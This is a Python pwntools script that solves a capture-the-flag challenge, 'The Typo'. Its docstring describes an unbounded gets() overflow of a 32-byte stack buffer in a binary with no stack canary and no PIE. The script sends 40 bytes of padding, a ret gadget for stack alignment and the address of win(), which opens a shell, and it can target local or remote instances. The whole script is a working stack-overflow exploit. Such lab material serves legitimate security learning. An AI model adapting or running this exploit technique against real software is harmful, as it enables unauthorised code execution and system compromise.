#!/usr/bin/env python3
"""
Solver for 'The Typo' pwn challenge.

Bug: vuln() shrank `buffer` to 32 bytes but still calls gets() with no
bound at all (a classic unbounded read "typo"). The binary is compiled
non-PIE with no stack canary, so we can overwrite the saved return
address directly with the address of win(), which pops a shell.

Stack layout (from objdump):
    buffer  @ rbp-0x20      (32 bytes)
    saved rbp               (8 bytes)
    saved return address    (8 bytes)   <-- overwrite this

    => 32 + 8 = 40 bytes of padding, then the target address.

Alignment note: jumping straight to win() crashes with SIGSEGV, because
system() internally uses SSE instructions that require the stack pointer
to be 16-byte aligned at the call, and a direct ret-overwrite leaves it
misaligned by 8 bytes. The fix is a classic one-gadget stack fixer: ret
through a single extra `ret` instruction first, which eats 8 bytes and
restores alignment before falling into win().

Usage:
    python3 solve.py            # run locally against ./chall
    python3 solve.py HOST PORT  # run against a remote instance
"""
from pwn import *
import sys

context.arch = "amd64"
context.log_level = "info"

RET_GADGET = 0x40101a  # a bare `ret` instruction, for 16-byte stack alignment
WIN_ADDR = 0x4011d6    # address of win(), from `objdump -d chall | grep '<win>:'`
OFFSET = 40             # bytes of padding needed to reach the saved return address

def main():
    if len(sys.argv) == 3:
        io = remote(sys.argv[1], int(sys.argv[2]))
    else:
        io = process("./chall")

    io.recvuntil(b"Enter your name: ")

    payload = b"A" * OFFSET
    payload += p64(RET_GADGET)  # fix stack alignment first
    payload += p64(WIN_ADDR)    # then jump to win()

    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    main()
